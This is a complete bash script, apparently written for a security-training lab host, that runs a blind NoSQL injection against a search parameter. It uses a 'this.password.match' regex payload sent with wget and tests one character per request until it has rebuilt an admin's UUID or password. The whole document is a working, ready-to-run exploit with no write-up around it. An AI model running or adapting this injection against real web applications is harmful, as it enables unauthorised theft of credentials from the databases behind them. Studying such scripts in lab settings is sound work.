#!/bin/bash
# This script was written to do blind nosql injection to enumerate the UUID
# Written by r00tpgp
# 10 Dec 2018
#
charset=("a" "b" "c" "d" "e" "f" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "-")
uri="http://ptl-f249ee43-0a61a3e2.libcurl.so/"
d=0

for ((j=0;j<=36;j+=1))
do
  for i in ${charset[@]}
  do
    printf "Trying... $i @ position $j \n" 
    out=`wget -qO- $uri/?search=admin\'%20%26%26%20this.password.match\(/^.{$j}$i/\)%00 | grep "?search="`
    if [[ "$out" =~ "<tr><td><a href=\"?search=" ]]
      then
        printf "Found UUID char: $i \n"
	pass+=$i
        break
    fi
  done
done
printf "UUID is: $pass \n"
